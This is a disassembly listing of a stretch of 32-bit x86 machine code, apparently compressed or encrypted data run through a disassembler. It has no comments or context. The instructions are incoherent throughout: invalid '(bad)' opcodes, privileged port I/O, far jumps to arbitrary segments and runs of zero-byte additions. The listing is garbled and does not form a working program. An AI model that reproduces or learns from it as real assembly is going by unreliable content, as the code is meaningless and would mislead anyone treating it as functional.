  41889f:	add    BYTE PTR [eax],bh
  4188a1:	jo     0x4188c5
  4188a3:	inc    DWORD PTR [edi+0x78ba5560]
  4188a9:	out    0x97,eax
  4188ab:	sub    eax,0x2d97c0b8
  4188b0:	test   al,0xf0
  4188b2:	xchg   edi,eax
  4188b3:	cmp    eax,0x5597c4a8
  4188b8:	js     0x418892
  4188ba:	xchg   edi,eax
  4188bb:	and    eax,0x1527ac78
  4188c0:	push   0xb9671dfc
  4188c5:	mov    ebp,esi
  4188c7:	jmp    0x357497ea
  4188cc:	pop    edi
  4188cd:	cdq    
  4188ce:	cwde   
  4188cf:	or     eax,0x2597dc68
  4188d4:	push   0x1dbb21d0
  4188d9:	out    0x32,eax
  4188db:	add    BYTE PTR [ecx+0x39],bh
  4188de:	in     al,dx
  4188df:	imul   ecx,DWORD PTR [eax]
  4188e2:	out    dx,al
  4188e3:	jmp    FWORD PTR [ecx]
  4188e5:	ds jae 0x41890c
  4188e8:	test   DWORD PTR [ebx+edx*1],edi
  4188eb:	adc    DWORD PTR [ecx+0x7313327a],esp
  4188f1:	cli    
  4188f2:	sbb    eax,DWORD PTR [ebx+ebx*4+0x6c000eb5]
  4188f9:	jnp    0x4188e6
  4188fb:	mov    DWORD PTR ds:0x35c70294,edi
  418901:	xchg   esp,eax
  418902:	sub    al,BYTE PTR [ecx]
  418904:	add    BYTE PTR [eax],al
  418906:	add    BYTE PTR [eax],al
  418908:	add    cl,ch
  41890a:	scas   eax,DWORD PTR es:[edi]
  41890b:	push   cs
  41890c:	mov    edx,DWORD PTR [edx-0x75]
  41890f:	dec    edx
  418910:	and    al,0x29
  418912:	jae    0x41898e
  418914:	mov    ebp,DWORD PTR ds:0xf58b3294
  41891a:	xchg   ebx,eax
  41891b:	sub    ch,bl
  41891d:	mov    ch,0x3d
  41891f:	push   ebx
  418920:	and    al,0xea
  418922:	xchg   DWORD PTR [edx],edx
  418924:	adc    DWORD PTR [esi+eiz*2-0x69],eax
  418928:	ret    0xe902
  41892b:	imul   edx,DWORD PTR [edx],0x13329233
  418931:	jno    0x418905
  418933:	in     eax,dx
  418934:	je     0x4188ea
  418936:	outs   dx,DWORD PTR ds:[esi]
  418937:	daa    
  418938:	(bad)  
  418939:	cmp    eax,0x955c97c8
  41893e:	xchg   esi,eax
  41893f:	push   esi
  418940:	cmp    esp,DWORD PTR [edx+0x4a]
  418943:	push   ss
  418944:	mov    DWORD PTR [ebp-0x5a76c966],esi
  41894a:	call   0x3b06:0x9a9d8b06
  418951:	cmp    ah,BYTE PTR [eax+0x6be0d85a]
  418957:	xor    bl,BYTE PTR [eax]
  418959:	nop
  41895a:	adc    dh,cl
  41895c:	and    esi,DWORD PTR [eax+0x16]
  41895f:	sub    BYTE PTR [esi-0x6c],bh
  418962:	jo     0x41893a
  418964:	and    ebp,DWORD PTR [eax-0x73]
  418967:	sbb    ch,bh
  418969:	int3   
  41896a:	jge    0x418972
  41896c:	jmp    0x418971
  418971:	add    BYTE PTR [edx-0x6cbcd7b8],dl
  418977:	(bad)  
  418978:	in     al,dx
  418979:	imul   esi,DWORD PTR [ecx+ecx*2-0x52],0xffffffa5
  41897e:	or     ebp,DWORD PTR [ebp-0xa]
  418981:	sub    ebx,DWORD PTR [ebx]
  418983:	sub    eax,0x5d1b13f6
  418988:	mul    BYTE PTR [edi]
  41898a:	stos   DWORD PTR es:[edi],eax
  41898b:	xlat   BYTE PTR ds:[ebx]
  41898c:	rol    DWORD PTR [esi-0x76d142b4],1
  418992:	push   esp
  418993:	mov    ch,0xa
  418995:	sub    ebx,ebx
  418997:	pop    ecx
  418998:	std    
  418999:	rcl    DWORD PTR [eax+0x2],0xde
  41899d:	and    edi,DWORD PTR [eax+esi*2+0x3d]
  4189a1:	mov    ebp,ebx
  4189a3:	imul   esp,DWORD PTR [ecx-0x38],0x19
  4189a7:	pop    ebp
  4189a8:	idiv   BYTE PTR [ebx]
  4189aa:	or     edx,DWORD PTR [ebp-0xa]
  4189ad:	adc    eax,DWORD PTR [edi-0x73dc2a0c]
  4189b3:	inc    eax
  4189b4:	push   ebx
  4189b5:	jle    0x418945
  4189b7:	add    BYTE PTR [edi-0x9f83dd],bh
  4189bd:	mov    BYTE PTR [ebp+edi*4+0xe],al
  4189c1:	xchg   esp,ebx
  4189c3:	scas   eax,DWORD PTR es:[edi]
  4189c4:	cs xchg esp,esi
  4189c7:	mov    bh,0x6
  4189c9:	cmp    ah,0xaf
  4189cc:	out    dx,al
  4189cd:	inc    DWORD PTR [edx+esi*8]
  4189d0:	adc    al,0x73
  4189d2:	xchg   ebx,eax
  4189d3:	out    0xa0,al
  4189d5:	add    BYTE PTR [eax],al
  4189d7:	add    BYTE PTR [eax],al
  4189d9:	add    BYTE PTR [eax],al
  4189db:	sbb    esi,DWORD PTR [ebx-0x10d2ee44]
  4189e1:	rcl    ebx,cl
  4189e3:	cwde   
  4189e4:	call   0x3f7:0xb34290f5
  4189eb:	inc    ebp
  4189ec:	out    dx,eax
  4189ed:	(bad)  
  4189ef:	mov    edi,0x37dfd406
  4189f4:	cmp    eax,0xff63e814
  4189f9:	out    dx,eax
  4189fa:	(bad)  
  4189fb:	int3   
  4189fc:	into   
  4189fd:	call   0xb61a1e8d
  418a02:	lea    edx,[edx+0x73]
  418a05:	pop    eax
  418a06:	or     BYTE PTR [edx-0x49f78f8b],bl
  418a0c:	cmp    al,0xbc
  418a0e:	out    0xa3,eax
  418a10:	mov    BYTE PTR [edi],bl
  418a12:	inc    esp
  418a13:	xlat   BYTE PTR ds:[ebx]
  418a14:	scas   al,BYTE PTR es:[edi]
  418a15:	and    eax,0x717a9a4c
  418a1a:	enter  0x9eb3,0x5f
  418a1e:	shr    BYTE PTR [ebp+0x1144f8b3],1
  418a24:	jno    0x418a20
  418a26:	mov    al,BYTE PTR [esi+ecx*8-0x55]
  418a2a:	mov    WORD PTR [ecx+0x7be7bc3b],?
  418a30:	int    0x2f
  418a32:	mov    edi,0xe7bc3d54
  418a37:	mov    edi,DWORD PTR ds:0xb56be79c
  418a3d:	mov    ecx,0x8a
  418a42:	add    BYTE PTR [eax],al
  418a44:	push   esp
  418a45:	into   
  418a46:	jecxz  0x4189d4
  418a48:	dec    esp
  418a49:	into   
  418a4a:	pop    es
  418a4b:	mov    edx,esp
  418a4d:	into   
  418a4e:	sti    
  418a4f:	mov    WORD PTR [edx-0x33],ds
  418a52:	or     ebp,eax
  418a54:	mov    ds:0xf48d1e07,eax
  418a59:	into   
  418a5a:	push   cs
  418a5b:	aad    0x1c
  418a5d:	out    0x32,al
  418a5f:	and    eax,0x3d32de16
  418a64:	adc    eax,0x8715ee8d
  418a69:	cmp    eax,0x3152e613
  418a6e:	add    esi,ecx
  418a70:	inc    esp
  418a71:	std    
  418a72:	xor    bl,ch
  418a74:	call   DWORD PTR [esi-0x36d7ea66]
  418a7a:	cdq    
  418a7b:	cmc    
  418a7c:	aaa    
  418a7d:	std    
  418a7e:	cdq    
  418a7f:	and    eax,0xc599ad38
  418a84:	aaa    
  418a85:	int    0x53
  418a87:	jmp    0xcbb0:0xd5331c8
  418a8e:	stc    
  418a8f:	int    0x10
  418a91:	cmp    esp,DWORD PTR [ebx+0xd]
  418a94:	add    BYTE PTR [edx],bh
  418a96:	dec    ebx
  418a97:	add    eax,0xd733aec
  418a9c:	enter  0x5b39,0x5
  418aa0:	clc    
  418aa1:	repnz xchg edi,eax
  418aa3:	mov    ebp,0x3629c8f7
  418aa8:	add    BYTE PTR [eax],al
  418aaa:	add    BYTE PTR [eax],al
  418aac:	add    BYTE PTR [eax+0x50174136],al
  418ab2:	xchg   DWORD PTR [edx+0x51d8af7d],ebx
  418ab8:	jmp    0xd4d7:0x70ddb380
  418abf:	cs pusha 
  418ac1:	call   esp
  418ac3:	push   ds
  418ac4:	pusha  
  418ac5:	xlat   BYTE PTR ds:[ebx]
  418ac6:	aam    0x32
  418ac8:	and    dh,BYTE PTR [eax+0x7ee3ed4]
  418ace:	test   eax,0x39cfd6ec
  418ad3:	push   ebx
  418ad4:	add    eax,0x433b88
  418ad9:	lea    eax,[esi-0xefdef6a]
  418adf:	dec    ebx
  418ae0:	pop    esi
  418ae1:	test   BYTE PTR [ebx-0x71],ch
  418ae4:	les    esp,FWORD PTR [ecx-0xe]
  418ae7:	add    al,BYTE PTR [eax]
  418ae9:	cmp    dh,ah
  418aeb:	div    edx
  418aed:	jmp    0x469a:0x8d8b52c2
  418af4:	push   ebp
  418af5:	mov    dl,0x42
  418af7:	xor    bl,BYTE PTR [eax-0x61]
  418afa:	cmp    ebp,DWORD PTR [esi+0x429a658b]
  418b00:	push   edi
  418b01:	mov    dl,0x72
  418b03:	xor    bl,BYTE PTR [edx+edi*1-0x1f]
  418b07:	xchg   ebp,eax
  418b08:	inc    esp
  418b09:	lea    edi,[esi-0x69]
  418b0c:	inc    eax
  418b0d:	adc    eax,0x33f5b5
  418b12:	add    BYTE PTR [eax],al
  418b14:	add    BYTE PTR [eax],al
  418b16:	outs   dx,DWORD PTR ds:[esi]
  418b17:	lock push edx
  418b19:	and    al,0xe6
  418b1b:	mov    bl,0x95
  418b1d:	inc    esp
  418b1e:	lea    esp,[esi-0x4772bb2c]
  418b24:	push   cs
  418b25:	mov    DWORD PTR ds:0x25895a90,ecx
  418b2b:	nop
  418b2c:	sub    bh,BYTE PTR [ebx]
  418b2e:	mov    bl,0xb7
  418b30:	cdq    
  418b31:	jmp    0x9b7b:0x8b0eb3e8
  418b38:	rcl    DWORD PTR [ebx+0x30],cl
  418b3b:	jp     0x418b6f
  418b3d:	sub    al,0x42
  418b3f:	fst    QWORD PTR [ebp+0x2787cd54]
  418b45:	int    0xb6
  418b47:	and    ch,BYTE PTR [ebp+0x37b3b901]
  418b4d:	jmp    0x6a872995
  418b52:	cdq    
  418b53:	ins    BYTE PTR es:[edi],dx
  418b54:	daa    
  418b55:	jmp    0xcb201bea
  418b5a:	retf   
  418b5b:	pop    esp
  418b5c:	sbb    eax,0x1dac584c
  418b61:	mov    ch,0x4f
  418b63:	stos   BYTE PTR es:[edi],al
  418b64:	sbb    eax,0xc0a942b5
  418b69:	cld    
  418b6a:	fsubr  QWORD PTR [ebp+0x75cc86de]
  418b70:	out    dx,al
  418b71:	mov    ah,al
  418b73:	ins    DWORD PTR es:[edi],dx
  418b74:	fiadd  DWORD PTR [esi-0x79018a14]
  418b7a:	add    BYTE PTR [eax],al
  418b7c:	add    BYTE PTR [eax],al
  418b7e:	add    ah,cl
  418b80:	ins    DWORD PTR es:[edi],dx
  418b81:	into   
  418b82:	xchg   ah,ah
  418b84:	jne    0x418b38
  418b86:	out    0x66,eax
  418b88:	add    eax,0xd51bfd2d
  418b8d:	not    BYTE PTR [edi]
  418b8f:	xchg   edi,eax
  418b90:	enter  0x23d5,0x68
  418b94:	add    al,0xce
  418b96:	and    edi,DWORD PTR [eax-0x53dc39fc]
  418b9c:	adc    dl,dh
  418b9e:	and    ecx,eax
  418ba0:	pushf  
  418ba1:	dec    esp
  418ba2:	xchg   DWORD PTR [ebp+esi*4-0xe],edx
  418ba6:	xor    al,dl
  418ba8:	mov    ecx,0x577423d6
  418bad:	loopne 0x418b99
  418baf:	mov    ds:0x900153d2,al
  418bb4:	add    ah,BYTE PTR [esi-0x29fdb3dd]
  418bba:	and    esp,DWORD PTR [edi+edx*8-0x6593dc2b]
  418bc1:	push   esp
  418bc2:	inc    esp
  418bc3:	je     0x418bfe
  418bc5:	adc    esi,DWORD PTR [edi]
  418bc7:	dec    esp
  418bc8:	ins    DWORD PTR es:[edi],dx
  418bc9:	jmp    0x9273:0x5216427d
  418bd0:	adc    edi,eax
  418bd2:	mov    DWORD PTR [edx+0x234731b2],edx
  418bd8:	mov    ebx,0x9eb3c860
  418bdd:	aaa    
  418bde:	mov    ecx,esp
  418be0:	into   
  418be1:	jecxz  0x418c0b
  418be3:	add    BYTE PTR [eax],al
  418be5:	add    BYTE PTR [eax],al
  418be7:	add    BYTE PTR [edx-0xc17abcf],bl
  418bed:	mov    dl,0x22
  418bef:	add    eax,0xa41bef56
  418bf4:	addr16 cmp al,0xb0
  418bf7:	cli    
  418bf8:	push   ds
  418bf9:	add    dh,ch
  418bfb:	cmp    al,0xcc
  418bfd:	into   
  418bfe:	adc    ecx,DWORD PTR [ecx+0x3cebced4]
  418c04:	aam    0xce
  418c06:	xlat   BYTE PTR ds:[ebx]
  418c07:	rcl    DWORD PTR [eax],0x7
  418c0a:	fsubr  st(3),st
  418c0c:	aaa    
  418c0d:	add    eax,0x6c9329b9
  418c12:	cmp    al,0xe8
  418c14:	jae    0x418bc8
  418c16:	jo     0x418be0
  418c18:	jae    0x418c28
  418c1a:	das    
  418c1b:	enter  0x9e73,0xc5
  418c1f:	pop    es
  418c20:	sbb    dh,BYTE PTR [eax+0x51]
  418c23:	or     BYTE PTR [edx],bl
  418c25:	je     0x418c99
  418c27:	dec    edi
  418c28:	adc    BYTE PTR [edi],al
  418c2a:	sbb    al,0x11
  418c2c:	nop
  418c2d:	(bad)  
  418c2e:	cmc    
  418c2f:	stc    
  418c30:	push   ebx
  418c31:	into   
  418c32:	out    0xb7,eax
  418c34:	jge    0x418c6f
  418c36:	test   bh,ah
  418c38:	inc    edi
  418c39:	xor    ah,cl
  418c3b:	add    DWORD PTR [eax],ecx
  418c3d:	scas   eax,DWORD PTR es:[edi]
  418c3e:	in     eax,0x45
  418c40:	push   esp
  418c41:	into   
  418c42:	call   0xd430a449
  418c47:	repz push ebp
  418c49:	cdq    
  418c4a:	cld    
  418c4b:	mov    BYTE PTR [eax],al
  418c4d:	add    BYTE PTR [eax],al
  418c4f:	add    BYTE PTR [eax],al
  418c51:	pop    esp
  418c52:	into   
  418c53:	scas   eax,DWORD PTR es:[edi]
  418c54:	sub    DWORD PTR [esi+ecx*8],0xe
  418c58:	mov    DWORD PTR [ebx-0x6bae6c49],edx
  418c5e:	mov    dl,0xe
  418c60:	imul   ecx,DWORD PTR [eax+0x785d8eba],0x90630ed1
  418c6a:	(bad)  
  418c6b:	imul   edi,DWORD PTR cs:[edi],0x3fe900d1
  418c72:	scas   eax,DWORD PTR es:[edi]
  418c73:	sub    BYTE PTR ds:0xd5630d78,ch
  418c79:	xchg   edi,eax
  418c7a:	scas   al,BYTE PTR es:[edi]
  418c7b:	xchg   esi,eax
  418c7c:	jmp    0xd14f:0xaf04b60b
  418c83:	add    al,ch
  418c85:	sbb    esi,esi
  418c87:	xor    al,BYTE PTR [ecx]
  418c89:	dec    esi
  418c8a:	call   0xcd53:0x6ca3dd18
  418c91:	mov    eax,ds:0x6cea96b2
  418c96:	(bad)  
  418c97:	xor    cl,ch
  418c99:	nop
  418c9a:	pop    esp
  418c9b:	inc    eax
  418c9c:	outs   dx,BYTE PTR ds:[esi]
  418c9d:	out    0xd0,eax
  418c9f:	es jb  0x418ce9
  418ca2:	shl    DWORD PTR [esi],1
  418ca4:	pop    esi
  418ca5:	inc    edi
  418ca6:	shl    DWORD PTR [edx],1
  418ca8:	push   esi
  418ca9:	aas    
  418caa:	shl    DWORD PTR [esi],1
  418cac:	inc    ecx
  418cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cae:	xchg   dh,ch
  418cb0:	inc    esi
  418cb1:	nop
  418cb2:	adc    BYTE PTR [ecx+ebp*1+0x0],0x0
  418cba:	es (bad) 
  418cbc:	in     eax,dx
  418cbd:	mov    ebp,0x9d999cef
  418cc2:	idiv   DWORD PTR [ebp+ebp*8-0x66271063]
  418cc9:	xchg   ebp,eax
  418cca:	mov    bh,0xf8
  418ccc:	in     eax,dx
  418ccd:	popf   
  418cce:	scas   eax,DWORD PTR es:[edi]
  418ccf:	hlt    
  418cd0:	aam    0xea
  418cd2:	xchg   edx,eax
  418cd3:	xchg   DWORD PTR [ebx+0x0],esp
  418cd6:	lds    ebp,FWORD PTR [eax-0x69]
  418cd9:	pop    esp
  418cda:	aad    0x94
  418cdc:	aas    
  418cdd:	mov    ch,dh
  418cdf:	mov    WORD PTR [ebx],?
  418ce1:	mov    ch,dh
  418ce3:	mov    WORD PTR [eax+ebp*8],?
  418ce6:	enter  0xebc3,0xff
  418cea:	add    ah,BYTE PTR [ebx+0x32]
  418ced:	cmp    dl,dh
  418cef:	jb     0x418d23
  418cf1:	pop    eax
  418cf2:	mov    ebx,0x99c60f5b
  418cf7:	(bad)  
  418cf8:	(bad)  
  418cf9:	sbb    edi,DWORD PTR [eax-0x50]
  418cfc:	pslld  mm6,mm2
  418cff:	bound  esi,QWORD PTR [edx]
  418d01:	cmp    al,0xf2
  418d03:	jb     0x418d37
  418d05:	sub    al,0xea
  418d07:	in     al,dx
  418d08:	inc    BYTE PTR [edx+0x54959f1c]
  418d0e:	push   ebp
  418d0f:	jl     0x418d38
  418d11:	push   esp
  418d12:	push   ebp
  418d13:	jo     0x418d30
  418d15:	mov    WORD PTR [ebp-0x38],?
  418d18:	jmp    0x418d19
  418d1a:	mov    ds:0x5c327a,al
  418d1f:	add    BYTE PTR [eax],al
  418d21:	add    BYTE PTR [eax],al
  418d23:	mov    dl,0x5a
  418d25:	xor    al,BYTE PTR [eax-0x56]
  418d28:	out    dx,eax
  418d29:	inc    BYTE PTR [edx+0x44959ec1]
  418d2f:	xchg   ebp,eax
  418d30:	call   0x8c1b:0x5e957c27
  418d37:	mov    eax,ecx
  418d39:	jmp    0x418d3a
  418d3b:	xor    ch,BYTE PTR [ecx-0x69]
  418d3e:	(bad)  
  418d3f:	packssdw mm1,QWORD PTR [edi+0x2ee35c4]
  418d46:	add    BYTE PTR [edx-0x26],ch
  418d49:	push   ds
  418d4a:	add    DWORD PTR ds:0x3a001e64,0x52
  418d51:	xor    al,BYTE PTR [eax+edx*4]
  418d54:	cdq    
  418d55:	lds    edx,FWORD PTR [edx+0x66]
  418d58:	push   0x53d03120
  418d5d:	in     eax,0xd8
  418d5f:	sbb    esp,DWORD PTR [eax+0x753486c1]
  418d65:	cli    
  418d66:	xchg   BYTE PTR [ebp+ebp*2-0x1a],cl
  418d6a:	xchg   BYTE PTR [ebp+esi*4-0x22],cl
  418d6e:	xchg   BYTE PTR [esi+ebp*4],al
  418d71:	out    dx,al
  418d72:	xchg   ah,ah
  418d74:	mov    ch,0xf6
  418d76:	ss aam 0xad
  418d79:	fimul  DWORD PTR [esi+eax*1]
  418d7c:	jae    0x418d91
  418d7e:	add    BYTE PTR [eax-0x33dc5a00],dl
  418d84:	adc    ch,BYTE PTR [esi+0x23]
  418d8a:	add    BYTE PTR [eax],al
  418d8c:	mov    al,ds:0x7423d612
  418d91:	push   0x944f8344
  418d96:	cwde   
  418d97:	mov    al,0x91
  418d99:	cdq    
  418d9a:	adc    cl,BYTE PTR ds:0x65c38d07
  418da0:	jnp    0x418d77
  418da2:	out    dx,al
  418da3:	dec    ebx
  418da4:	lahf   
  418da5:	or     eax,0x9927ff9e
  418daa:	fwait
  418dab:	inc    esp
  418dac:	je     0x418def
  418dae:	xchg   edi,eax
  418daf:	inc    ecx
  418db0:	pop    ss
  418db1:	add    ch,BYTE PTR [esi-0x52335fdd]
  418db7:	and    ebp,DWORD PTR [eax-0x6fffed66]
  418dbd:	adc    BYTE PTR [ebp+0x39],bl
  418dc0:	push   esp
  418dc1:	mov    ch,0xda
  418dc3:	jp     0x418e3f
  418dc5:	add    BYTE PTR [esi-0x41ef7bdd],dh
  418dcb:	and    ebx,DWORD PTR [eax+0x3d73eb6b]
  418dd1:	mov    dl,0xf7
  418dd3:	mov    al,0x64
  418dd5:	aaa    
  418dd6:	cmp    bh,dh
  418dd8:	fadd   QWORD PTR [esp+esi*8]
  418ddb:	mov    eax,ds:0x3b2fe86
  418de0:	inc    ebx
  418de1:	lods   eax,DWORD PTR ds:[esi]
  418de2:	mov    bh,0xfe
  418de4:	aam    0x5
  418de6:	in     al,0xca
  418de8:	push   0x9076b77
  418ded:	out    0xd3,al
  418def:	out    0x0,eax
  418df1:	add    BYTE PTR [eax],al
  418df3:	add    BYTE PTR [eax],al
  418df5:	push   cs
  418df6:	out    dx,al
  418df7:	sbb    esp,esp
  418df9:	push   ss
  418dfa:	not    DWORD PTR [ebx]
  418dfc:	adc    BYTE PTR [ecx],bl
  418dfe:	call   FWORD PTR [ebx]
  418e00:	adc    BYTE PTR [ecx+0x7fc7cd79],bh
  418e06:	ss push esp
  418e08:	loopne 0x418d91
  418e0a:	mov    dl,0x5e
  418e0c:	mov    eax,0xb870a6b3
  418e11:	mov    bl,0xf6
  418e13:	cmp    eax,0xdbf69908
  418e18:	jecxz  0x418de5
  418e1a:	mov    eax,0xa273c08c
  418e1f:	nop
  418e20:	call   DWORD PTR [eax]
  418e22:	pop    ss
  418e23:	aam    0x1b
  418e25:	nop
  418e26:	repz bound ebp,QWORD PTR [eax-0x382f4d56]
  418e2d:	jae    0x418e19
  418e2f:	jecxz  0x418e96
  418e31:	or     DWORD PTR [edi],eax
  418e33:	aam    0xdf
  418e35:	or     bh,dh
  418e37:	sbb    esp,esp
  418e39:	sbb    bh,bh
  418e3b:	adc    edx,DWORD PTR [eax]
  418e3d:	mov    ecx,0x548ab874
  418e42:	(bad)  
  418e43:	fisttp WORD PTR [esp+ecx*2-0x2f13382a]
  418e4a:	repnz add BYTE PTR [esi],bh
  418e4d:	mov    ecx,0xaae0f6d
  418e52:	div    DWORD PTR [edx]
  418e54:	(bad)  [eax+0xcd534f]
  418e5a:	add    BYTE PTR [eax],al
  418e5c:	add    BYTE PTR [eax],al
  418e5e:	stos   DWORD PTR es:[edi],eax
  418e5f:	cmp    DWORD PTR [ebx-0x3b],ebx
  418e62:	out    0xae,eax
  418e64:	mov    ebp,0x6d40bd26
  418e69:	out    0x4,eax
  418e6b:	out    dx,eax
  418e6c:	xor    ah,cl
  418e6e:	jl     0x418e20
  418e70:	cdq    
  418e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e72:	(bad)  
  418e73:	aad    0x99
  418e75:	es or  ebp,edi
  418e78:	xor    dl,cl
  418e7a:	or     dh,bh
  418e7c:	xor    bh,cl
  418e7e:	adc    edi,esi
  418e80:	xor    dh,BYTE PTR ds:0xeb6d2d8c
  418e86:	cs mov dl,0x9b
  418e89:	dec    edi
  418e8a:	nop
  418e8b:	sub    edx,DWORD PTR [ebx+0xd]
  418e8e:	push   eax
  418e8f:	scas   al,BYTE PTR es:[edi]
  418e90:	mov    ebp,0x11f97025
  418e95:	test   eax,0x5e1e895c
  418e9a:	stos   DWORD PTR es:[edi],eax
  418e9b:	mov    dl,0xe
  418e9d:	jmp    0xd574852a
  418ea2:	adc    edi,esi
  418ea4:	xor    bh,BYTE PTR ds:0xc57b2b94
  418eaa:	sub    eax,DWORD PTR [ebx*1+0x26d4ef72]
  418eb1:	jno    0x418eda
  418eb3:	iret   
  418eb4:	xchg   esi,eax
  418eb5:	or     eax,0xa791802a
  418eba:	lea    ebp,[ecx+edx*8]
  418ebd:	sub    DWORD PTR [ebx+0x2a18b6],esi
  418ec3:	add    BYTE PTR [eax],al
  418ec5:	add    BYTE PTR [eax],al
  418ec7:	sbb    esi,DWORD PTR [esi-0x2ac09cc4]
  418ecd:	dec    BYTE PTR [esi+0x4a]
  418ed0:	jb     0x418ec2
  418ed2:	add    ch,bh
  418ed4:	mov    edx,0x2ea10ad6
  418ed9:	push   ebx
  418eda:	and    al,0xb9
  418edc:	mov    ch,0xcf
  418ede:	mov    ch,dh
  418ee0:	mov    ch,ch
  418ee2:	cmp    BYTE PTR [edi-0x49],0x95
  418ee6:	je     0x418eb5
  418ee8:	pusha  
  418ee9:	xchg   edi,eax
  418eea:	sti    
  418eeb:	xor    BYTE PTR [ecx+0x32],al
  418eee:	adc    dl,ah
  418ef0:	fsubr  QWORD PTR [ecx+0x55]
  418ef3:	and    al,BYTE PTR [ecx+0x32]
  418ef6:	sbb    BYTE PTR [edx],ah
  418ef8:	pop    ecx
  418ef9:	xor    dh,BYTE PTR [eax]
  418efb:	xor    ch,BYTE PTR [ecx+0x32]
  418efe:	adc    BYTE PTR [edx-0x62bb6a0a],ch
  418f04:	jle    0x418e9d
  418f06:	inc    esp
  418f07:	lea    esi,[edx-0x69]
  418f0a:	retf   0x62a2
  418f0d:	xor    bh,BYTE PTR [eax]
  418f0f:	les    edx,FWORD PTR [edx+0x7a9d5c97]
  418f15:	je     0x418ea2
  418f17:	popf   
  418f18:	xchg   edx,eax
  418f19:	pop    edx
  418f1a:	and    DWORD PTR [esi],0xffffffc8
  418f1d:	bound  ecx,QWORD PTR [esi]
  418f1f:	mov    ah,0xb2
  418f21:	xor    eax,0x232d9f41
  418f26:	inc    ebx
  418f27:	xor    bh,BYTE PTR [eax+0x32]
  418f2a:	cmp    BYTE PTR [eax],al
  418f2c:	add    BYTE PTR [eax],al
  418f2e:	add    BYTE PTR [eax],al
  418f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f31:	leave  
  418f32:	xchg   edi,eax
  418f33:	inc    esp
  418f34:	dec    ebp
  418f35:	inc    eax
  418f36:	xchg   edi,eax
  418f37:	pop    esp
  418f38:	pop    ebp
  418f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f3a:	push   ebx
  418f3b:	add    eax,DWORD PTR [ecx]
  418f3d:	jl     0x418f26
  418f3f:	jl     0x418f35
  418f41:	sub    esp,DWORD PTR [ebx+0x24]
  418f44:	dec    ebp
  418f45:	sub    eax,0x2ba5244b
  418f4a:	jnp    0x418f70
  418f4c:	mov    eax,ds:0x90245b2b
  418f51:	test   DWORD PTR [ecx-0x2faa5384],ebx
  418f57:	cmp    bh,al
  418f59:	mov    BYTE PTR [esi+0x25c0e654],dl
  418f5f:	mov    DWORD PTR [ebp+ebp*4-0x1e],edx
  418f63:	inc    eax
  418f64:	xchg   ebx,eax
  418f65:	fcom   DWORD PTR [edi-0x38fdb6f4]
  418f6b:	and    esi,DWORD PTR [edx+eax*1-0x31]
  418f6f:	and    eax,DWORD PTR [eax-0x6bdc28ee]
  418f75:	fs (bad) 
  418f77:	and    ebx,DWORD PTR [eax-0x78]
  418f7a:	xchg   esi,eax
  418f7b:	sub    ah,BYTE PTR [esi+0x54892580]
  418f81:	ins    DWORD PTR es:[edi],dx
  418f82:	inc    BYTE PTR [edi-0x396676b3]
  418f88:	out    dx,eax
  418f89:	test   edi,0xe2551358
  418f8f:	shl    DWORD PTR [ecx+ecx*4+0xbfe1],0x0
  418f97:	add    BYTE PTR [eax],al
  418f99:	imul   ebx,DWORD PTR [ebx-0x6f],0xffffffec
  418f9d:	fadd   QWORD PTR [esi+ebx*8]
  418fa0:	and    esi,eax
  418fa2:	pushf  
  418fa3:	cdq    
  418fa4:	pop    esp
  418fa5:	mov    ah,0xe9
  418fa7:	fmul   QWORD PTR [eax+0x23d61451]
  418fad:	in     al,dx
  418fae:	rcr    BYTE PTR [ecx+0x11b56c7c],0xd5
  418fb5:	or     ebp,ecx
  418fb7:	out    dx,al
  418fb8:	aaa    
  418fb9:	or     ecx,ecx
  418fbb:	push   es
  418fbc:	add    DWORD PTR [ecx+0x3c],ecx
  418fbf:	cmp    al,0xc6
  418fc1:	int3   
  418fc2:	jne    0x418fd9
  418fc4:	add    BYTE PTR [ecx],cl
  418fc6:	int    0xee
  418fc8:	pop    ss
  418fc9:	dec    esi
  418fca:	aad    0xee
  418fcc:	or     eax,0xcf5eb290
  418fd1:	mov    bl,0xe6
  418fd3:	pop    esi
  418fd4:	xlat   BYTE PTR ds:[ebx]
  418fd5:	mov    bl,0xe2
  418fd7:	add    BYTE PTR [edx],bh
  418fd9:	test   DWORD PTR ds:0xb29001b3,ebp
  418fdf:	pusha  
  418fe0:	inc    ecx
  418fe1:	sbb    esi,esp
  418fe3:	adc    ebx,eax
  418fe5:	push   ss
  418fe6:	out    0x1b,al
  418fe8:	loopne 0x418ff2
  418fea:	out    0x13,al
  418fec:	fdivr  DWORD PTR [eax+0x77]
  418fef:	pop    edi
  418ff0:	mov    edi,0xcf5ec273
  418ff5:	jae    0x418fbd
  418ff7:	stos   BYTE PTR es:[edi],al
  418ff8:	mov    al,bh
  418ffa:	sub    BYTE PTR [edi+ebx*8+0x0],ah
  419001:	add    BYTE PTR [ebx-0x45],dl
  419004:	and    BYTE PTR [esi],al
  419006:	sbb    ebp,DWORD PTR [ecx+0x2b9003f9]
  41900c:	adc    edx,ebp
  41900e:	scas   al,BYTE PTR es:[edi]
  41900f:	or     ecx,eax
  419011:	fdiv   st(1),st
  419013:	mov    ds:0xae6ef950,al
  419018:	cmp    eax,DWORD PTR [edi-0x47]
  41901b:	jno    0x419012
  41901d:	(bad)  
  41901e:	pop    edi
  41901f:	loop   0x418fed
  419021:	ins    BYTE PTR es:[edi],dx
  419022:	push   ebp
  419023:	in     al,0xe4
  419025:	ins    BYTE PTR es:[edi],dx
  419026:	inc    edx
  419027:	jecxz  0x419032
  419029:	xor    eax,0x8b13d6e4
  41902e:	(bad)  
  41902f:	(bad)  
  419030:	xor    ecx,DWORD PTR [ecx-0x74d82924]
  419036:	in     al,0xd6
  419038:	aaa    
  419039:	mov    edx,esp
  41903b:	(bad)  
  41903c:	pop    ss
  41903d:	mov    ebx,esp
  41903f:	(bad)  
  419040:	adc    ebp,DWORD PTR [ecx+eiz*8]
  419043:	test   DWORD PTR [ebp-0x2c08e6cb],edx
  419049:	out    0x8c,eax
  41904b:	dec    ebp
  41904c:	cvtps2pi mm6,QWORD PTR [eax]
  41904f:	into   
  419050:	cdq    
  419051:	or     eax,0xcd91ddf0
  419056:	out    0xa5,eax
  419058:	push   cs
  419059:	push   0x30
  41905b:	rol    BYTE PTR [edx],cl
  41905d:	jmp    0xed747f6a
  419062:	sbb    dh,bh
  419064:	xor    ch,BYTE PTR [ecx+0x0]
